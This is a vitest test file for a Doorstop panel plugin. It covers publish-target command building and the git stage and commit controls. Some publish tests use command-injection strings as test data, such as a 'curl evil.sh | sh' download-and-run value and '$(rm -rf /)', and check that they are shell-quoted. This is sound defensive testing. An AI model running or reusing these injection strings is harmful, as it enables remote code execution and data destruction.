// @vitest-environment happy-dom
//
// Element-level tests for the project-actions section (src/browser/sections/project-actions.ts):
// publish target wiring and the git strip/stage/commit controls. Describe
// blocks moved verbatim from doorstop-panel-element.test.ts; shared scaffolding
// lives in ../doorstop-panel-element-test-support.ts.

import { afterEach, describe, expect, it, vi } from "vitest";
import { type WorkspacePanelContext } from "@jmfederico/pi-web/plugin-api";
import {
  DOORSTOP_GIT_COMMIT_OPERATION,
  DOORSTOP_GIT_STAGE_OPERATION,
  DOORSTOP_GIT_STATUS_OPERATION,
  type DoorstopGitStatusResponse,
} from "../../doorstop-backend-contract.js";
import { DoorstopWorkspaceController, doorstopPaths } from "../doorstop-panel-controller.js";
import { type DoorstopWorkspaceResult, loadDoorstopWorkspace } from "../doorstop-panel.js";
import { DEFAULT_OPENDOOR_SETTINGS } from "../../doorstop-settings.js";
import {
  doorstopPublishCommand,
  doorstopPublishTarget,
  type DoorstopPanelBodyElement,
} from "../doorstop-panel-elements.js";
import { createFakeFiles, dirEntry, fileEntry, text, tree } from "../../test-support.js";
import { flushMicro, makeResult, makeTreeResult, settle } from "../../test-fixtures.js";
import {
  stubConfirm,
  makeGitStatusResponse,
  withGitStatusBackend,
  mountBody,
  mountGitBody,
  gitStatusCalls,
  bindBody,
  makeRunResponse,
  resetElementTestEnvironment,
} from "../doorstop-panel-element-test-support.js";

// Shared DOM/confirm reset between tests.
afterEach(resetElementTestEnvironment);

describe("DoorstopPanelBodyElement (publish target wiring, spec §7.2)", () => {
  it("publishes to the workspace publishTarget from a settings fixture, with the exact command", async () => {
    const confirmSpy = stubConfirm(true);
    const { files } = createFakeFiles({
      trees: {
        "": tree([dirEntry("reqs", "reqs")]),
        "reqs": tree([fileEntry(".doorstop.yml", "reqs/.doorstop.yml"), fileEntry("REQ0001.yml", "reqs/REQ0001.yml")]),
      },
      reads: {
        ".pi-web/opendoor.json": text(JSON.stringify({ version: 1, publishTarget: "./site" })),
        "reqs/.doorstop.yml": text("settings:\n  prefix: REQ\n  digits: 4"),
        "reqs/REQ0001.yml": text("text: The system shall do X."),
      },
    });
    const { body, controller, context } = await mountBody(() => loadDoorstopWorkspace(files));
    // loadDoorstopWorkspace's async chain is a few frames longer than a bare
    // Promise.resolve result — give it room to land before asserting.
    for (let turn = 0; turn < 50; turn += 1) await Promise.resolve();
    bindBody(body, controller, context);
    await flushMicro(body);
    const result = body.result;
    if (result === undefined) throw new Error("no result");
    expect(result.settings.publishTarget).toBe("./site");
    expect(doorstopPublishTarget(result)).toBe("./site");
    expect(doorstopPublishCommand(result)).toBe("doorstop publish all ./site");

    // The button title reflects the target; clicking confirms + runs it.
    const publish = body.shadowRoot?.querySelector<HTMLElement>(".doorstop-publish");
    expect(publish?.getAttribute("title")).toBe("Publish the tree to ./site");
    publish?.click();
    await settle();
    expect(confirmSpy).toHaveBeenCalledWith("Publish the Doorstop tree as HTML to ./site in the workspace terminal?");
    expect(context.terminal.runCommand).toHaveBeenCalledWith({
      title: "Doorstop: publish",
      command: "doorstop publish all ./site",
      metadata: { "opendoor.op": "publish" },
      open: false,
    });
  });

  it("publishes to the default target when the result has no settings (and when there is no result)", async () => {
    const confirmSpy = stubConfirm(true);
    const { body, context } = await mountBody(() => Promise.resolve(makeTreeResult()));
    const root = body.shadowRoot;
    if (root === null) throw new Error("shadow root");

    // Strip settings from the result — a result built by an older caller, or
    // the hardened path before settings land.
    const bare = body.result;
    if (bare === undefined) throw new Error("no result");
    body.result = { index: bare.index } as DoorstopWorkspaceResult;
    await flushMicro(body);
    expect(doorstopPublishTarget(body.result)).toBe(DEFAULT_OPENDOOR_SETTINGS.publishTarget);
    expect(doorstopPublishCommand(body.result)).toBe("doorstop publish all ./public");

    root.querySelector<HTMLElement>(".doorstop-publish")?.click();
    await settle();
    expect(confirmSpy).toHaveBeenCalledWith("Publish the Doorstop tree as HTML to ./public in the workspace terminal?");
    expect(context.terminal.runCommand).toHaveBeenCalledWith({
      title: "Doorstop: publish",
      command: "doorstop publish all ./public",
      metadata: { "opendoor.op": "publish" },
      open: false,
    });

    // With NO result at all the fallback still applies (default target).
    vi.mocked(context.terminal.runCommand).mockClear();
    body.result = undefined;
    await flushMicro(body);
    expect(doorstopPublishTarget(undefined)).toBe(DEFAULT_OPENDOOR_SETTINGS.publishTarget);
    root.querySelector<HTMLElement>(".doorstop-publish")?.click();
    await settle();
    expect(context.terminal.runCommand).toHaveBeenCalledWith({
      title: "Doorstop: publish",
      command: "doorstop publish all ./public",
      metadata: { "opendoor.op": "publish" },
      open: false,
    });
  });

  it("shell-quotes a settings publishTarget containing shell metacharacters so a committed .pi-web/opendoor.json cannot inject a command", async () => {
    const confirmSpy = stubConfirm(true);
    const hostile = "./public; curl evil.sh | sh";
    const { body, context } = await mountBody(() => Promise.resolve(makeTreeResult()));
    const root = body.shadowRoot;
    if (root === null) throw new Error("shadow root");

    // The settings validator ACCEPTS this string — a safe relative path (no
    // `..`, not absolute, no backslash) — so the command boundary in
    // doorstopPublishCommand is the last line of defense and must quote it.
    const bare = body.result;
    if (bare === undefined) throw new Error("no result");
    body.result = { index: bare.index, settings: { publishTarget: hostile, excludedDirectories: [], showAdditionalAttribute: [], commitAfterReview: false } };
    await flushMicro(body);
    expect(doorstopPublishTarget(body.result)).toBe(hostile);
    expect(doorstopPublishCommand(body.result)).toBe("doorstop publish all './public; curl evil.sh | sh'");

    // The confirm dialog shows the target literally (display only — the user
    // sees what they configured); the executed command carries it as ONE
    // single-quoted argument, so `;`, `|`, and the rest cannot execute.
    root.querySelector<HTMLElement>(".doorstop-publish")?.click();
    await settle();
    expect(confirmSpy).toHaveBeenCalledWith(
      "Publish the Doorstop tree as HTML to ./public; curl evil.sh | sh in the workspace terminal?",
    );
    expect(context.terminal.runCommand).toHaveBeenCalledWith({
      title: "Doorstop: publish",
      command: "doorstop publish all './public; curl evil.sh | sh'",
      metadata: { "opendoor.op": "publish" },
      open: false,
    });
  });

  it("quotes only targets outside the inert token alphabet; an embedded quote uses the shell '\\'' escape", () => {
    const result = makeTreeResult();
    const withTarget = (publishTarget: string): DoorstopWorkspaceResult => ({
      index: result.index,
      settings: { publishTarget, excludedDirectories: [], showAdditionalAttribute: [], commitAfterReview: false },
    });
    // Inert `[\w./-]` targets keep the canonical bare command spelling.
    expect(doorstopPublishCommand(withTarget("./public"))).toBe("doorstop publish all ./public");
    expect(doorstopPublishCommand(withTarget("./docs/final-2"))).toBe("doorstop publish all ./docs/final-2");
    // Anything else is emitted as a single shell-quoted argument.
    expect(doorstopPublishCommand(withTarget("./docs (final)"))).toBe("doorstop publish all './docs (final)'");
    expect(doorstopPublishCommand(withTarget("./it's"))).toBe("doorstop publish all './it'\\''s'");
    expect(doorstopPublishCommand(withTarget("$(rm -rf /)"))).toBe("doorstop publish all '$(rm -rf /)'");
    // An explicit target is honored (the publish click threads the same
    // value it put in the confirm message, so the two stay consistent).
    expect(doorstopPublishCommand(result, "./site")).toBe("doorstop publish all ./site");
  });

  it("pins the freeze contract the fixtures depend on: the settings default is truly frozen, the model index only by convention", () => {
    // DEFAULT_OPENDOOR_SETTINGS is handed out BY REFERENCE on every defaults
    // path, so it is genuinely frozen — one consumer mutating what it
    // received must not corrupt the shared default for everyone. The model
    // index, by contrast, is frozen by CONVENTION only (the contract's
    // wording): the findings fixtures splice into `index.findings` and the
    // no-settings test strips `settings` off a result. Pin the runtime truth
    // here so a drift to runtime-freezing fails at this fixture with a clear
    // message instead of a confusing TypeError mid-assertion.
    expect(Object.isFrozen(DEFAULT_OPENDOOR_SETTINGS)).toBe(true);
    const index = makeTreeResult().index;
    expect(Object.isFrozen(index)).toBe(false);
    expect(Object.isFrozen(index.findings)).toBe(false);
    expect(Object.isFrozen(index.diagnostics)).toBe(false);
  });
});

describe("DoorstopPanelBodyElement (git strip + stage + commit, plan-add-git-actions Phase F item 23)", () => {
  it("hides all three git controls on an unpaired install (backendActive false)", async () => {
    const { body } = await mountBody(() => Promise.resolve(makeTreeResult()));
    const root = body.shadowRoot;
    expect(root?.querySelector(".doorstop-git-status")).toBeNull();
    expect(root?.querySelector(".doorstop-git-stage")).toBeNull();
    expect(root?.querySelector(".doorstop-git-commit")).toBeNull();
  });

  it("renders the ready strip's counts from gitStatusText and re-fetches on click", async () => {
    const backend = vi.fn((operation: string) =>
      operation === DOORSTOP_GIT_STATUS_OPERATION
        ? Promise.resolve(makeGitStatusResponse({ ahead: 1, staged: 2, dirty: 3 }))
        : Promise.resolve(makeRunResponse()),
    );
    const { body } = await mountGitBody(backend);
    const strip = body.shadowRoot?.querySelector<HTMLButtonElement>(".doorstop-git-status");
    expect(strip).not.toBeNull();
    expect(strip?.getAttribute("aria-busy")).toBe("false");
    expect(strip?.querySelector(".doorstop-git-status-text")?.textContent).toBe(
      "⎇ main · 2 staged · 3 dirty · ↑1",
    );

    // Clicking the strip re-fetches through the controller (the controller
    // JOINS in-flight fetches, so this is one extra round-trip, exactly).
    const before = gitStatusCalls(backend);
    strip?.click();
    await flushMicro(body);
    expect(gitStatusCalls(backend)).toBe(before + 1);
  });

  it("renders the no-git text on the git:false view", async () => {
    // The git:false response must drop branch/ahead/behind too — the
    // contract couples those fields to git:true (junk otherwise).
    const backend = vi.fn((operation: string) =>
      operation === DOORSTOP_GIT_STATUS_OPERATION
        ? // A literal no-git payload: the contract couples branch/ahead/behind
          // to git:true, so the degradation shape carries none of them.
          Promise.resolve({ git: false, staged: 0, dirty: 0, files: [] } as DoorstopGitStatusResponse)
        : Promise.resolve(makeRunResponse()),
    );
    const { body } = await mountGitBody(backend);
    // The refetch after hostConnected sticks (the mount-time fetch landed
    // dropped) and carries the git:false answer → the strip's no-git text.
    expect(body.shadowRoot?.querySelector(".doorstop-git-status-text")?.textContent).toBe("no git");
  });

  it("disables Stage all while a run is in flight or the index has no documents", async () => {
    const backend = withGitStatusBackend(() => Promise.resolve(makeRunResponse()));
    const { body } = await mountGitBody(backend);
    const root = body.shadowRoot;
    const stage = root?.querySelector<HTMLButtonElement>(".doorstop-git-stage");
    expect(stage?.disabled).toBe(false);

    body.runInProgress = "Doorstop: validate";
    await flushMicro(body);
    expect(root?.querySelector<HTMLButtonElement>(".doorstop-git-stage")?.disabled).toBe(true);
    expect(root?.querySelector<HTMLButtonElement>(".doorstop-git-commit-button")?.disabled).toBe(true);
    expect(root?.querySelector<HTMLInputElement>(".doorstop-git-commit-input")?.disabled).toBe(true);
    body.runInProgress = undefined;
    await flushMicro(body);

    // An empty index disables Stage all (an empty stage request is a
    // contradiction the browser never emits — the request parser rejects it).
    body.result = makeResult([], [], [], new Set());
    await flushMicro(body);
    expect(root?.querySelector<HTMLButtonElement>(".doorstop-git-stage")?.disabled).toBe(true);
  });

  it("clicking Stage all sends doorstop.git-stage with the loaded index's paths", async () => {
    const backend = withGitStatusBackend(() =>
      Promise.resolve({ status: "staged", staged: 2 }),
    );
    const { body, controller } = await mountGitBody(backend);
    const before = backend.mock.calls.filter(([operation]) => operation === DOORSTOP_GIT_STAGE_OPERATION).length;
    body.shadowRoot?.querySelector<HTMLButtonElement>(".doorstop-git-stage")?.click();
    await flushMicro(body);
    expect(backend.mock.calls.filter(([operation]) => operation === DOORSTOP_GIT_STAGE_OPERATION)).toHaveLength(
      before + 1,
    );
    expect(backend).toHaveBeenLastCalledWith(DOORSTOP_GIT_STAGE_OPERATION, {
      paths: doorstopPaths(body.result as DoorstopWorkspaceResult),
    });
    expect(controller.runInProgress).toBeUndefined();
    expect(controller.lastRun).toMatchObject({ op: "git-stage", status: "ok" });
  });

  it("keeps the commit button disabled on an empty input and surfaces the inline error on Enter (no request)", async () => {
    const backend = withGitStatusBackend(() => Promise.resolve(makeRunResponse()));
    const { body } = await mountGitBody(backend);
    const root = body.shadowRoot;
    const input = root?.querySelector<HTMLInputElement>(".doorstop-git-commit-input");
    const commit = root?.querySelector<HTMLButtonElement>(".doorstop-git-commit-button");
    expect(input).not.toBeNull();
    expect(commit?.disabled).toBe(true); // empty input → disabled

    // Enter with an empty input: the inline error appears and NO request
    // goes out (the browser must never send an empty commit message).
    const commitsBefore = backend.mock.calls.filter(([operation]) => operation === DOORSTOP_GIT_COMMIT_OPERATION).length;
    input?.dispatchEvent(new KeyboardEvent("keydown", { key: "Enter", bubbles: true, composed: true }));
    await flushMicro(body);
    expect(root?.querySelector("[role='alert']")?.textContent).toContain("Enter a commit message");
    expect(
      backend.mock.calls.filter(([operation]) => operation === DOORSTOP_GIT_COMMIT_OPERATION),
    ).toHaveLength(commitsBefore);
  });

  it("sends doorstop.git-commit with the message only and clears the input after success", async () => {
    const backend = vi.fn((operation: string) =>
      operation === DOORSTOP_GIT_STATUS_OPERATION
        ? Promise.resolve(makeGitStatusResponse())
        : operation === DOORSTOP_GIT_COMMIT_OPERATION
          ? Promise.resolve({ status: "committed", sha: "abc1234" })
          : Promise.resolve(makeRunResponse()),
    );
    const { body } = await mountGitBody(backend);
    const root = body.shadowRoot;
    const input = root?.querySelector<HTMLInputElement>(".doorstop-git-commit-input");
    const commit = root?.querySelector<HTMLButtonElement>(".doorstop-git-commit-button");
    if (input === undefined || input === null) throw new Error("no commit input");

    input.value = "  Land the strip  ";
    input.dispatchEvent(new Event("input", { bubbles: true, composed: true }));
    await flushMicro(body);
    expect(commit?.disabled).toBe(false);

    const commitsBefore = backend.mock.calls.filter(([operation]) => operation === DOORSTOP_GIT_COMMIT_OPERATION).length;
    commit?.click();
    await flushMicro(body);
    expect(
      backend.mock.calls.filter(([operation]) => operation === DOORSTOP_GIT_COMMIT_OPERATION),
    ).toHaveLength(commitsBefore + 1);
    expect(backend).toHaveBeenCalledWith(DOORSTOP_GIT_COMMIT_OPERATION, { message: "Land the strip" });

    // Success (status ok + the git-commit op) clears the input; a failed
    // commit would keep the message for a corrected retry.
    expect(input.value).toBe("");
  });

  it("Escape clears the input and the inline error", async () => {
    const backend = withGitStatusBackend(() => Promise.resolve(makeRunResponse()));
    const { body } = await mountGitBody(backend);
    const root = body.shadowRoot;
    const input = root?.querySelector<HTMLInputElement>(".doorstop-git-commit-input");
    if (input === undefined || input === null) throw new Error("no commit input");

    // Produce an inline error first (Enter on an empty input).
    input.dispatchEvent(new KeyboardEvent("keydown", { key: "Enter", bubbles: true, composed: true }));
    await flushMicro(body);
    expect(root?.querySelector("[role='alert']")).not.toBeNull();

    input.dispatchEvent(new KeyboardEvent("keydown", { key: "Escape", bubbles: true, composed: true }));
    await flushMicro(body);
    expect(input.value).toBe("");
    expect(root?.querySelector("[role='alert']")).toBeNull();
  });

  it("the strip re-fetches after a stage's invalidate (the single cache-clearing point)", async () => {
    const backend = withGitStatusBackend(() => Promise.resolve({ status: "staged", staged: 2 }));
    const { body } = await mountGitBody(backend);
    const before = gitStatusCalls(backend);
    body.shadowRoot?.querySelector<HTMLButtonElement>(".doorstop-git-stage")?.click();
    await flushMicro(body);
    bindBody(body, (body as DoorstopPanelBodyElement).controller as DoorstopWorkspaceController, body.context as WorkspacePanelContext);
    await flushMicro(body);
    // The run's success path invalidated (clearing the cached view), and the
    // element's next render re-fetched the strip through the orphan guard.
    expect(gitStatusCalls(backend)).toBeGreaterThan(before);
  });
});
